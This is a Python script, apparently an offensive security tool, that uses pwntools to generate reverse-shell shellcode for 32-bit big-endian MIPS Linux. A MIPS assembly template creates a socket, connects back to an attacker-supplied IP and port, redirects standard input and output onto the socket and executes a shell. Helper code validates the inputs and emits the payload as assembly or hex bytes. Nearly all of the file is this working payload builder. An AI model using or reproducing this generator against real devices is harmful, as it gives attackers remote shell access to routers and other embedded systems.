#!/usr/bin/env python3
#! -*- coding:utf8 -*-

from pwn import *
from shells import Shells
import re
import ipaddress

# Our shellcode skeleton
SHELLCODE = '''
    .set    noat
    li      $t7,  -6
    nor     $t7, $zero
    addi    $a0, $t7, -3
    addi    $a1, $t7, -3
    slti    $a2, $zero, -1
    li      $v0, 4183
    syscall 0x40404
    sw      $v0, -1($sp)
    lw      $a0, -1($sp)
    li      $t7, -3
    nor     $t7, $zero
    sw      $t7, -0x20($sp)
    lui     $t6, {port}
    ori     $t6, $t6, 0x7a69
    sw      $t6, -0x1c($sp)
    lui     $t6, {ip_part_1}
    ori     $t6, $t6, {ip_part_2}
    sw      $t6, -0x1a($sp)
    addiu   $a1, $sp, -0x1e
    li      $t4, -17
    nor     $a2, $t4, $zero
    li      $v0, 4170 
    syscall 0x40404
    li      $t7,-3
    nor     $a1, $t7,$zero
    lw      $a0, -1($sp)
    dup2_loop:
    li      $v0, 4063 
    syscall 0x40404
    addi    $a1,$a1,-1
    li      $at,-1
    bne     $a1,$at, dup2_loop
    slti    $a2, $zero, -1
    {shell}
    addiu   $a0, $sp, -0x14
    sw      $a0, -8($sp)
    sw      $zero, -4($sp)
    addiu   $a1, $sp, -8
    li      $v0, 4011 
    syscall 0x40404'''

IP_REGEX = '^((25[0-5]|(2[0-4]|1[0-9]|[1-9]|)[0-9])(\.(?!$)|$)){4}$'

# Convert an IP adress to its hex representation and then split it into 2 4-bytes chunks
# 127.0.0.1 -> ('0x7f00', '0x0001')
def ip_adress_to_hex(ip_addr):
    ip_addr = str(hex(int(ipaddress.ip_address(ip_addr)))[2:].zfill(8))
    ip_addr = ("0x{}".format(ip_addr[:4]), "0x{}".format(ip_addr[4:]))
    return ip_addr

class ReverseShellGenerator:

    def __init__(self, IP, port, shell = "sh"):
        self.context = context.update(arch='mips', os='linux', bits=32, endian='big')
        self.IP      = IP
        self.port    = int(port) 
        self.shell   = shell.upper()

    def generate_shellcode(self):
        try:
            # We check that the port is in the range 1-65535 and that the IP is valid
            if 1 <= self.port <= 65535 and re.match(IP_REGEX, self.IP):
                
                # Convert IP adress to its hex representation
                ip_addr = ip_adress_to_hex(self.IP)

                # We format the shellcode with the appropriate parameters
                self.shellcode = SHELLCODE.format(
                    port      = hex(self.port),
                    ip_part_1 = ip_addr[0]    ,
                    ip_part_2 = ip_addr[1]    ,
                    shell     = Shells.shells_list[self.shell]
                ) 
            else:
                raise ValueError

        except ValueError:
            print("Port must be in range 1-65535 and the IP adress must be valid")
            return 
    
    # Returns the ASM version of the shellcode
    def get_MIPS_shellcode(self):
        return self.shellcode

    # Returns the hex version of the shellcode
    def get_hex_shellcode(self):
        return ''.join(['\\x%02x' % x for x in asm(self.shellcode) ])